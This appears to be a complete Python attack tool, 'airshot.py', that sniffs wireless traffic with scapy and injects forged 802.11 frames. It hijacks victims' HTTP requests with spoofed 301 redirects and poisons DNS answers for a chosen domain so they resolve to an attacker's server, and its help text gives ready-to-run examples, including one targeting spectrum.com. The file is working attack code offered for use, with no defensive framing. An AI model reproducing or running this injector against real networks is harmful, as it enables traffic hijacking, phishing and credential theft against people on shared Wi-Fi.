#!/usr/bin/env python3

import subprocess
from scapy.all import *
import argparse

# Set interface into monitor mode. Probably do not need if you tell them to specify the monitor mode interface
def set_monitor_mode(interface):
	try:

		subprocess.run(['iw', 'dev', interface, 'add', 'mon0', 'type', 'monitor' ])
		subprocess.run(['ip', 'link', 'mon0', 'up'])
	except:
		print("Error setting interafce into monitor mode")

# Sniff packets for HTTP
def http_packet_handler(packet):
	url = ("http://"+args.serverip).encode()
	http_response = (
		b"HTTP/1.1 301 Moved Permanently\r\n"
		b"Location: %b\r\n"
		b"Content-Length: 0\r\n"
		b"\r\n"
		) % url
	if packet.haslayer(TCP):
		if packet[TCP].dport == 80:
			
			#802.11 Stuff
			request = bytes(packet[TCP].payload)
			if b"GET" in request:
				new_dst_mac = packet[Dot11].addr2
				new_src_mac = packet[Dot11].addr1
				wifi_frame = Dot11(type=2, subtype=0, FCfield="from-DS", addr1=new_dst_mac, addr2=new_src_mac, addr3=new_src_mac)

			#TCP Stuff
				new_dst_ip = packet[IP].src
				new_src_ip = packet[IP].dst
				client_port = packet[TCP].sport
				seq_num = packet[TCP].ack
				payload_len = len(packet[TCP].payload)
				ack_num = packet[TCP].seq + payload_len
				print(f"I see http traffic coming from {new_dst_ip}")
			#Payload
				evil_payload = RadioTap() / wifi_frame / LLC() / SNAP() / IP(dst=new_dst_ip, src=new_src_ip) / TCP(sport=80, dport=client_port, flags="PA", seq=seq_num, ack=ack_num) / raw(http_response)
				sendp(evil_payload, iface=args.interface)
			

def dns_packet_handler(packet):
	if packet.haslayer(UDP):
		if DNS in packet:
			if packet[DNS].qr == 0:
				#UDP stuff and Payload
				query_name = packet[DNS].qd.qname.decode()
				if query_name == f"{args.domain}.":
									#802.11 Stuff
					target_mac = packet[Dot11].addr2
					source_mac = packet[Dot11].addr1
					wifi_frame = Dot11(type=2, subtype=0, FCfield="from-DS", addr1=target_mac, addr2=source_mac, addr3=source_mac)

				# IP Stuff
					target_ip = packet[IP].src
					new_source = packet[IP].dst
					ip = IP(dst=target_ip, src=new_source)
					print(f"Recieved DNS query for {query_name}")
					udp_payload = UDP(sport=53, dport=packet[UDP].sport) / DNS(id=packet[DNS].id, qr=1, opcode=0, aa=1, rd=0, ra=0, z=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=packet[DNS].qd, an=DNSRR(rrname=query_name, type="A", ttl=3600, rdata=args.serverip))

				#Final payload
					evil_payload = RadioTap() / wifi_frame / LLC() / SNAP() / ip / udp_payload
					sendp(evil_payload, iface=args.interface)







parser = argparse.ArgumentParser(description="Inject a redirect Response to a target over wireless. Has two modes, HTTP Redirect and DNS Responses.")

#Specify Interface
parser.add_argument("-i", "--interface", required=True, help="Interface used to monitor and inject")

#Specify Channel
parser.add_argument("-c", "--channel", required=True, help="The channel of the target")

# HTTP flag
parser.add_argument("--http", required=False, help="Do HTTP Redirect, otherwise it will default to DNS redirects")
#Specify http website to redirect the victim to
#parser.add_argument("-u", "--url", required=False, help="The URL to redirect the victim to")

#Specify DNS IP if using DNS
parser.add_argument("-ip", "--serverip", required=True, help="The IP address of the server you want to redirect HTTP/DNS queries to")
#Specify DNS Name to Poision. "Example: google.com"
parser.add_argument("-d", "--domain", required=False, help="The target Domain you want to spoof. Cannot do wildcard or things will break. Example: google.com")

# Giving user exampels
parser.epilog = '''\
Examples:\n
	Redirecting HTTP traffic to 192.168.16.102 on channel 9:\n
		python3 airshot.py -i wlan0mon -c 9 -ip 192.168.16.102 --http true\n
\n
	DNS Poisoning attack against https://www.spectrum.com to resolve to 192.168.16.102:\n
		python3 airshot.py -i wlan0mon -c 9 -ip 192.168.16.102 --domain www.spectrum.com

'''

args = parser.parse_args()

subprocess.run(['iw', 'dev', args.interface, 'set', 'channel', args.channel])
if args.http:
	sniff(filter="tcp and port 80",iface=args.interface, prn=http_packet_handler, store=0)
else:
	sniff(filter="udp and port 53", iface=args.interface, prn=dns_packet_handler, store=0)

